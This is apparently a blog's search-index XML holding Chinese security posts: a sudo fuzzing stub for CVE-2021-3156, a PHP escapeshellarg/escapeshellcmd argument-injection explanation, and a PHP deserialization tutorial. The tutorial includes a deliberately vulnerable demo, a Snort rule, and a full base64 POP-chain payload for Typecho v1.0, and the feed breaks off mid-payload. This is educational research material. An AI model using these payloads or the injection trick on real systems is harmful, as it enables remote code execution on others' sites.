<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Fuzz Sudo with AFL</title>
    <link href="/2021/05/Fuzz-Sudo-with-AFL/"/>
    <url>/2021/05/Fuzz-Sudo-with-AFL/</url>
    
    <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p><strong>CVE-2021-3156</strong></p><p>使用AFLplusplus对sodu进行fuzz</p><p>首先从<a href="https://www.sudo.ws/">sudo官网</a>下载存在漏洞的sudo源码，本文采用sudo-1.9.1</p><p>了解sudo</p><blockquote><p><strong>Sudo</strong> （<strong>s</strong>ubstitute <strong>u</strong>ser [或 <strong>s</strong>uper<strong>u</strong>ser] <strong>do</strong>），是一种<a href="https://zh.wikipedia.org/wiki/%E9%9B%BB%E8%85%A6%E7%A8%8B%E5%BC%8F">程序</a>，用于<a href="https://zh.wikipedia.org/wiki/%E9%A1%9EUnix%E7%B3%BB%E7%B5%B1">类Unix</a><a href="https://zh.wikipedia.org/wiki/%E4%BD%9C%E6%A5%AD%E7%B3%BB%E7%B5%B1">操作系统</a>如<a href="https://zh.wikipedia.org/wiki/BSD">BSD</a>，<a href="https://zh.wikipedia.org/wiki/Mac_OS_X">Mac OS X</a>，以及<a href="https://zh.wikipedia.org/wiki/GNU/Linux">GNU&#x2F;Linux</a>以允许用户透过安全的方式使用特殊的权限运行程序 （通常为<a href="https://zh.wikipedia.org/wiki/%E4%BD%9C%E6%A5%AD%E7%B3%BB%E7%B5%B1">系统</a>的<a href="https://zh.wikipedia.org/wiki/%E8%B6%85%E7%B4%9A%E4%BD%BF%E7%94%A8%E8%80%85">超级用户</a>）。</p><p>【维基百科】</p></blockquote><p><img src="/Users/hvnt3r/Blog/%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93/img/Fuzz-Sudo-with-AFL/image-20210507220014027.png" alt="image-20210507220014027"></p><p>由图可见sudoedit是指向sudo的链接，那sudo是如何在执行时区分当前用户运行的是sudo还是sudoedit来进入不同的执行逻辑呢？原因在下图，sudo使用getprogname获取当前</p><p><img src="/Users/hvnt3r/Blog/%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93/img/Fuzz-Sudo-with-AFL/image-20210507220240934.png" alt="image-20210507220240934"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>一个PHP代码注入漏洞</title>
    <link href="/2021/02/%E4%B8%80%E4%B8%AAPHP%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/02/%E4%B8%80%E4%B8%AAPHP%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP-escapeshellarg-与escapeshellcmd"><a href="#PHP-escapeshellarg-与escapeshellcmd" class="headerlink" title="PHP escapeshellarg() 与escapeshellcmd()"></a>PHP escapeshellarg() 与escapeshellcmd()</h1><blockquote><p>最近在对某产品的漏洞进行复现与发散绕过，遇到了一个将escapeshellarg()与escapeshellcmd()一起使用导致命令执行的漏洞，因此就记录一下漏洞成因以及绕过手法。</p></blockquote><p>首先补充一下背景知识，在unix系统中，被单引号包裹的部分如果存在变量，则这个变量不会被解析，但是被双引号包裹的部分在执行时，bash会先将变量名解析为变量的值再使用。</p><span id="more"></span><p><img src="https://i.loli.net/2021/02/09/2xbfAnvMO6WZKqm.png" alt="命令示例"></p><h4 id="escapeshellarg-的定义："><a href="#escapeshellarg-的定义：" class="headerlink" title="escapeshellarg()的定义："></a>escapeshellarg()的定义：</h4><blockquote><p><strong>escapeshellarg</strong> — 把字符串转码为可以在 shell 命令里使用的参数 </p><p><strong>功能</strong> ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec()，system() 执行运算符(反引号) </p><p><strong>定义</strong> ：<code>string escapeshellarg ( string $arg )</code></p></blockquote><p><img src="https://i.loli.net/2021/02/09/TX8A3kLd2Zcx6z1.png" alt="转义结果"></p><p>由上图可见<code>escapeshellarg()</code>会为参数加上单引号</p><p>另外说一下与<code>escapeshellarg()</code>类似的php过滤函数<code>escapeshellcmd()</code>，以下是<code>escapeshellcmd()</code>的定义:</p><h4 id="escapeshellcmd-的定义："><a href="#escapeshellcmd-的定义：" class="headerlink" title="escapeshellcmd()的定义："></a>escapeshellcmd()的定义：</h4><blockquote><p><strong>escapeshellcmd</strong> — shell 元字符转义</p><p>功能：<strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到exec()或system()函数，或者执行操作符之前进行转义。</p><p>反斜线（\）会在以下字符之前插入： <em>&amp;#;&#96;|*?~&lt;&gt;^()[]{}$</em>, <em>\x0A</em> 和 <em>\xFF*。 *’</em> 和 <em>“</em> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <em>%</em> 和 <em>!</em> 字符都会被空格代替。</p><p><strong>定义</strong> ：<code>string escapeshellcmd ( string $command)</code></p></blockquote><p><img src="https://i.loli.net/2021/02/09/oN4uKvrc1Zs3kdW.png" alt="转义结果"></p><p>由上图可见escapeshellcmd()函数会将输入的命令中的特殊字符进行转义。</p><hr><p>以上两个函数都是PHP自带的过滤函数，这两个函数单独使用时并不会出现什么问题，但是当这两个函数结合使用时，并不会时应用变得更加安全，下面举个例子来证明一下:</p><p>假如用户传入的数据为<code>192.168.64.2 -v -d a=1</code>：</p><p><img src="https://i.loli.net/2021/02/09/fyV1s94PTiQDeJA.png" alt="漏洞示例"></p><p>可以看到<code>192.168.64.2 -v -d a=1</code>经过escapeshellarg()函数处理之后加上了单引号：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.64.2</span> -v -d a=<span class="hljs-number">1</span><br>||<br>\/<br>&#x27;<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">64</span>.<span class="hljs-number">2</span> -v -d a=<span class="hljs-number">1</span>&#x27;<br></code></pre></td></tr></table></figure><p>由于处理后的字符串中单引号可配对，且无满足escapeshellcmd()函数转义的其他特殊符号，所以处理后的结果不变：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27;192.168.64.2 -v -d a=1&#x27;<br><span class="hljs-string">||</span><br>\/<br>&#x27;192.168.64.2 -v -d a=1&#x27;<br></code></pre></td></tr></table></figure><p>因此实际执行的命令为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> &#x27;<span class="hljs-number">192.168.64.2</span> -v -d a=<span class="hljs-number">1</span>&#x27;<br></code></pre></td></tr></table></figure><p>结合上文内容，bash中被单引号包裹的变量不会被解析为值，所以<code>-v -d a=1</code>不会被解析为参数，因此没有参数逃逸的情况发生。</p><p>但是如果用户输入的数据中加入了奇数个单引号，情况就不一样了，假如用户输入数据为<code> 192.168.64.2 &#39; -v -d a=1</code>，实际的处理过程如下：</p><p>由于字符串中存在一个单引号，因此escapeshellarg()函数会转义其中的单引号并用成对的单引号将转义部分两侧的字符串连接起来：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.64.2</span> &#x27; -v -d a=<span class="hljs-number">1</span><br>          ||<br>          \/<br>&#x27;<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">64</span>.<span class="hljs-number">2</span> &#x27;\&#x27;&#x27; -v -d a=<span class="hljs-number">1</span>&#x27;<br></code></pre></td></tr></table></figure><p>但是经过escapeshellcmd()函数时，escapeshellcmd()将特殊字符<code>\</code>进行转义变为了<code>\\</code>，同时识别到最后一个单引号未闭合，因此也为最后一个单引号添加转义符号成为<code>\&#39;</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-string">&#x27;192.168.64.2 &#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1&#x27;<br>          ||<br>          \/<br><span class="hljs-string">&#x27;192.168.64.2 &#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1\&#x27;<br></code></pre></td></tr></table></figure><p>因此经过escapeshellarg()与escapeshellcmd()函数处理之后实际执行的命令为：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">curl <span class="hljs-string">&#x27;192.168.64.2 &#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1\&#x27;<br></code></pre></td></tr></table></figure><p>闭合的双引号部分可以省略，<code>\\</code>被bash识别为<code>\</code>，因此这个命令可简化为如下形式：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript">curl <span class="hljs-string">&#x27;192.168.64.2 &#x27;</span><span class="hljs-string">\\&#x27;&#x27;</span> -v -d a=<span class="hljs-number">1</span><span class="hljs-string">\&#x27;</span><br>          ||<br>          <span class="hljs-string">\/</span><br>curl <span class="hljs-number">192.168</span>.<span class="hljs-number">64.2</span> <span class="hljs-string">\</span> -v -d a=<span class="hljs-number">1</span><span class="hljs-string">\&#x27;</span><br></code></pre></td></tr></table></figure><p>本命令即为向<code>192.168.64.2 \</code>发起请求，请求的数据为POST的a&#x3D;1，因此造成了参数逃逸。</p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞挖掘</tag>
      
      <tag>PHP代码注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化漏洞成因、防御、绕过</title>
    <link href="/2021/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E3%80%81%E9%98%B2%E5%BE%A1%E3%80%81%E7%BB%95%E8%BF%87/"/>
    <url>/2021/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E3%80%81%E9%98%B2%E5%BE%A1%E3%80%81%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-PHP反序列化漏洞成因"><a href="#0x01-PHP反序列化漏洞成因" class="headerlink" title="0x01 PHP反序列化漏洞成因"></a>0x01 PHP反序列化漏洞成因</h2><h3 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h3><blockquote><p>所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 –php官方文档</p></blockquote><p>serialize() ：返回带有变量类型和值的字符串</p><p>unserialize() ：想要将已序列化的字符串变回 PHP 的值</p><span id="more"></span><p>代码示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">example</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$test</span>;<br>        &#125;<br>&#125;<br><span class="hljs-variable">$new</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">example</span>();<br><span class="hljs-variable">$new</span>-&gt;test=<span class="hljs-string">&quot;sangfor&quot;</span>;<br><span class="hljs-variable">$ser</span> =  <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$new</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$ser</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>));<br><span class="hljs-meta">?&gt;</span><br><br><br>output:<br><br>O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;example&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;sangfor&quot;</span>;&#125;<br>example <span class="hljs-title function_ invoke__">Object</span><br>(<br>    [test] =&gt; sangfor<br>)<br></code></pre></td></tr></table></figure><p>序列化字符串的格式为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;example&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;sangfor&quot;</span>;&#125;<br><br>变量类型：类名长度：类名：属性数量：｛属性类型：属性名长度：属性名；属性值类型：属性值长度：属性值内容｝<br></code></pre></td></tr></table></figure><p>常见的反序列化数据类型标志：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">i</span> - 整数<br>d - 浮点数<br>O - 对象<br>R - 引用<br>S - 字符串hex<br>s - 字符串<br><span class="hljs-selector-tag">a</span> - 数组<br><span class="hljs-selector-tag">b</span> - 布尔值<br>N - NULL<br></code></pre></td></tr></table></figure><h3 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h3><p>在php中有一些函数不需要调用就可以执行，称这种为方法为魔术方法，常见的PHP魔术函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>()，类的构造函数<br><span class="hljs-title function_ invoke__">__destruct</span>()，类的析构函数<br><span class="hljs-title function_ invoke__">__call</span>()，在对象中调用一个不可访问方法时调用<br><span class="hljs-title function_ invoke__">__callStatic</span>()，用静态方式中调用一个不可访问方法时调用<br><span class="hljs-title function_ invoke__">__get</span>()，获得一个类的成员变量时调用<br><span class="hljs-title function_ invoke__">__set</span>()，设置一个类的成员变量时调用<br><span class="hljs-title function_ invoke__">__isset</span>()，当对不可访问属性调用<span class="hljs-keyword">isset</span>()或<span class="hljs-keyword">empty</span>()时调用<br><span class="hljs-title function_ invoke__">__unset</span>()，当对不可访问属性调用<span class="hljs-keyword">unset</span>()时被调用。<br><span class="hljs-title function_ invoke__">__sleep</span>()，执行<span class="hljs-title function_ invoke__">serialize</span>()时，先会调用这个函数<br><span class="hljs-title function_ invoke__">__wakeup</span>()，执行<span class="hljs-title function_ invoke__">unserialize</span>()时，先会调用这个函数<br><span class="hljs-title function_ invoke__">__toString</span>()，类被当成字符串时的回应方法<br><span class="hljs-title function_ invoke__">__invoke</span>()，调用函数的方式调用一个对象时的回应方法<br><span class="hljs-title function_ invoke__">__set_state</span>()，调用<span class="hljs-title function_ invoke__">var_export</span>()导出类时，此静态方法会被调用。<br><span class="hljs-title function_ invoke__">__clone</span>()，当对象复制完成时调用<br><span class="hljs-title function_ invoke__">__autoload</span>()，尝试加载未定义的类<br><span class="hljs-title function_ invoke__">__debugInfo</span>()，打印所需调试信息<br></code></pre></td></tr></table></figure><h3 id="构造攻击链（POP与ROP）"><a href="#构造攻击链（POP与ROP）" class="headerlink" title="构造攻击链（POP与ROP）"></a>构造攻击链（POP与ROP）</h3><p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。比如栈溢出的控制点是ret处，那么ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。</p><p>ROP的核心思想：攻击者扫描已有的动态链接库和可执行文件，提取出可以利用的指令片段(gadget)，这些指令片段均以ret指令结尾，即用ret指令实现指令片段执行流的衔接。操作系统通过栈来进行函数的调用和返回。函数的调用和返回就是通过压栈和出栈来实现的。</p><p>面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。</p><h3 id="PHP反序列化漏洞Demo与漏洞利用"><a href="#PHP反序列化漏洞Demo与漏洞利用" class="headerlink" title="PHP反序列化漏洞Demo与漏洞利用"></a>PHP反序列化漏洞Demo与漏洞利用</h3><h4 id="漏洞Demo"><a href="#漏洞Demo" class="headerlink" title="漏洞Demo"></a>漏洞Demo</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">demo</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;name;<br>        <span class="hljs-variable">$a</span>(<span class="hljs-variable language_">$this</span>-&gt;age);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$h</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">demo</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$h</span>);<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;h&#x27;</span>]);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="漏洞Poc"><a href="#漏洞Poc" class="headerlink" title="漏洞Poc"></a>漏洞Poc</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">payload:(适用于<span class="hljs-title function_ invoke__">destruct</span>() <span class="hljs-title function_ invoke__">wakeup</span>())<br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;demo&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>通过参数h将序列化字符串传递给Demo，demo再被反序列化之后自动调用<code>__destruct()</code>魔法函数导致程序运行<code>assert(phpinfo())</code>，这一步骤用到的<code>__destruct()</code>即为攻击链的一个节点，真实环境中需要利用多个节点串联为攻击链，具体实例见下文。</p><h2 id="0x02-防御侧（snort）"><a href="#0x02-防御侧（snort）" class="headerlink" title="0x02 防御侧（snort）"></a>0x02 防御侧（snort）</h2><p>规则示例（非PHP反序列化漏洞）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rules">alert tcp $EXTERNAL_NET any -&gt; $SQL_SERVERS $ORACLE_PORTS ( msg:&quot;SERVER-ORACLE dbms_repcat.purge_master_log buffer overflow attempt&quot;; flow:to_server,established; content:&quot;dbms_repcat.purge_master_log&quot;,nocase; pcre:&quot;/((\w+)[\r\n\s]*\x3a=[\r\n\s]*(\x27[^\x27]&#123;1075,&#125;\x27|\x22[^\x22]&#123;1075,&#125;\x22)[\r\n\s]*\x3b.*gname[\r\n\s]*=&gt;[\r\n\s]*\2|gname\s*=&gt;\s*(\x27[^\x27]&#123;1075,&#125;|\x22[^\x22]&#123;1075,&#125;)|\(\s*(\x27[^\x27]*\x27|\x22[^\x22]+\x22)\s*,\s*(\x27[^\x27]&#123;1075,&#125;|\x22[^\x22]&#123;1075,&#125;))/si&quot;; metadata:ruleset community; reference:url,www.appsecinc.com/resources/alerts/oracle/2004-0001/25.html; classtype:attempted-user; sid:2792; rev:4; )<br></code></pre></td></tr></table></figure><p>规则动作举例：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">alert：使用选定的报警方法产生报警信息，并且记录数据包 <br><span class="hljs-built_in">log</span>：记录数据包 <br>pass：忽略数据包 <br><span class="hljs-built_in">activate</span>：报警，接着打开其它的dynamic规则 <br>dynamic：保持空闲状态，直到被activete规则激活，作为一条<span class="hljs-built_in">log</span>规则 <br></code></pre></td></tr></table></figure><h2 id="0x03-绕过方法"><a href="#0x03-绕过方法" class="headerlink" title="0x03 绕过方法"></a>0x03 绕过方法</h2><h3 id="漏洞环境："><a href="#漏洞环境：" class="headerlink" title="漏洞环境："></a>漏洞环境：</h3><blockquote><p> 本次漏洞环境采用Typecho v1.0反序列化漏洞</p></blockquote><p>本漏洞的产生位置为<code>install.php</code>，查看文件源码有以下内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$config</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title class_">Typecho_Cookie</span>::<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;__typecho_config&#x27;</span>)));<br>    <span class="hljs-title class_">Typecho_Cookie</span>::<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;__typecho_config&#x27;</span>);<br>    <span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Typecho_Db</span>(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;adapter&#x27;</span>], <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;prefix&#x27;</span>]);<br>    <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">addServer</span>(<span class="hljs-variable">$config</span>, <span class="hljs-title class_">Typecho_Db</span>::READ | <span class="hljs-title class_">Typecho_Db</span>::WRITE);<br>    <span class="hljs-title class_">Typecho_Db</span>::<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$db</span>);<br></code></pre></td></tr></table></figure><p>从上述代码可知两个信息：</p><p>1、GET请求的finish非空</p><p>2、__typecho_config字段中存放payload</p><p>跟进Typecho_Db类发现此类中存在一个构造函数，此构造函数中存在一个将成员与字符串进行拼接的操作，由上文中提到的魔法函数可知，此步骤可能触发<code>__toString()</code>魔法函数，因此从源码中寻找可用的包含<code>__toString()</code>的类。</p><p><img src="https://i.loli.net/2021/02/09/FcJilg6ba81TuAh.png" alt="Typecho_Db中的__construct()"></p><p>在Typecho_Feed中找到了可用的<code>__toString()</code>魔法函数</p><p><img src="https://i.loli.net/2021/02/09/hJIcTR7dmSEy2N6.png" alt="__toString()"></p><p>在这个魔法函数中找到了属性调用的代码，当目标类中不存在screenName属性时可以触发<code>__get()</code>魔法函数，下一步在源码中寻找可用的<code>__get()</code>魔法函数</p><p><img src="https://i.loli.net/2021/02/09/bvI5XzCSgfGQV4P.png" alt="__get()"></p><p>在Typecho_Request中找到了<code>__get()</code>魔法函数：</p><p><img src="https://i.loli.net/2021/02/09/bdpsjBveqYmk7F8.png" alt="__get()魔法函数"></p><p><code>__get()</code>魔法函数中调用<code>_applyFilter</code>中又可以用于命令执行的函数<code>call_user_func()</code>：</p><p><img src="https://i.loli.net/2021/02/09/uCQgS976qHm4b8L.png" alt="目标函数"></p><p>到这里一条完整的构造链就梳理出来了，完整payload如下：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">__typecho_config<span class="hljs-operator">=</span>YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUxMTc5NTIwMTtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30<span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>使用上文payload可以执行phpinfo()函数，将payload进行base64解码之后可得以下内容：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;adapter&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Typecho_Feed&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;Typecho_Feed_type&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;RSS 2.0&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Typecho_Feed_items&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;title&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;link&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;date&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1511795201</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;category&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;O:<span class="hljs-number">15</span>:<span 